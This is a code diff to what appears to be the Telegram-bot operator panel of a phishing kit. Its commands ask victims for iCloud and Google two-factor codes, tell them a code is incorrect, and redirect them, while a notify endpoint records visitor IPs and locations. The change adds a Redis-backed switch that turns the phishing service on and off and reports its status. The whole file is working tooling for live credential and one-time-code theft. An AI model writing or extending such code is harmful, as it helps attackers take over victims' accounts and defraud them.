@@ -56,6 +56,8 @@ COMMANDS = {
     "REQUEST_ICLOUD_2FA_OTP_AGAIN": "Incorrect verification code.",
     "CORRECT_OTP": "Correct",
     "FINISH": "Redirecting user to the specified URL",
+    "TOGGLE_AVAILABILITY": "",
+    "CHECK_STATUS": "",
 }
 
 # Initialize bot
@@ -105,8 +107,22 @@ def get_location(ip):
 def handle_button_click(update: Update, context):
     query = update.callback_query
     command = query.data
-    
-    if command == "REQUEST_GOOGLE_2STEPS":
+
+
+
+    if command == "TOGGLE_AVAILABILITY":
+        current = redis_client.get("service_available")
+        new_value = "False" if (current and current.decode() == "True") else "True"
+        redis_client.set("service_available", new_value)
+        status = "🟢 Available" if new_value == "True" else "🔴 Unavailable"
+        query.answer(f"Availability toggled: {status}")
+        return
+    elif command == "CHECK_STATUS":
+        current = redis_client.get("service_available") or b"True"
+        status = "🟢 Available" if current.decode() == "True" else "🔴 Unavailable"
+        query.answer(status)
+        return
+    elif command == "REQUEST_GOOGLE_2STEPS":
         try:
             query.answer("Please send the number to use for Google 2-step verification")
             bot.send_message(
@@ -227,6 +243,12 @@ def send_message():
 def notify():
     if request.method == 'OPTIONS':
         return jsonify({"status": "success"}), 200
+
+
+
+    available = redis_client.get("service_available") or b"True"
+    if available.decode() == "False":
+        return jsonify({"available": False})
 
     try:
         ip = request.remote_addr
